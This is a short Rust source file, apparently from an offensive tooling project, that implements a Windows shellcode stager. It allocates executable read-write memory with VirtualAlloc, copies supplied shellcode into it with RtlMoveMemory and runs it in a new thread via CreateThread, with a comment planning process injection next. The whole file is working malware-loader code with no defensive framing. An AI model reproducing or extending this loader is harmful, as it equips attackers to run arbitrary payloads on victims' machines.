//! This is a basic stager for some shellcode
//! It maps some memory, slaps in the shellcode, and runs it.
//! [Rust programmers when they see `unsafe` blocks in my code](https://www.youtube.com/watch?v=k_BgxAch4u0)
//!
//! TODO: process injection

use winapi::um::winnt::RtlMoveMemory;
use windows::core::{Error, HSTRING};
use windows::Win32::Foundation::{E_POINTER, HANDLE};
use windows::Win32::System::Memory::{
    VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateThread, LPTHREAD_START_ROUTINE, THREAD_CREATION_FLAGS,
};

// Execute shellcode
pub fn exec(shellcode: &mut [u8]) -> Result<HANDLE, Error> {
    // Map out a memory region
    let alloced_mem = unsafe {
        VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    mv_mem(alloced_mem, shellcode)?;

    // Execute the shellcode
    unsafe {
        let lp_start_addr: LPTHREAD_START_ROUTINE = Some(std::mem::transmute(alloced_mem));

        CreateThread(None, 0, lp_start_addr, None, THREAD_CREATION_FLAGS(0), None)
    }
}

// Move shellcode to allocated memory
fn mv_mem(alloced_mem: *mut std::ffi::c_void, shellcode: &mut [u8]) -> Result<(), Error> {
    let size = shellcode.len();

    let alloced_mem: *mut winapi::ctypes::c_void = alloced_mem.cast();
    if alloced_mem.is_null() {
        return Err(Error::new(E_POINTER, HSTRING::new()));
    }

    let shellcode_mem: *mut winapi::ctypes::c_void = shellcode.as_mut_ptr().cast();
    if shellcode_mem.is_null() {
        return Err(Error::new(E_POINTER, HSTRING::new()));
    }

    unsafe {
        RtlMoveMemory(alloced_mem, shellcode_mem, size);
    }

    Ok(())
}
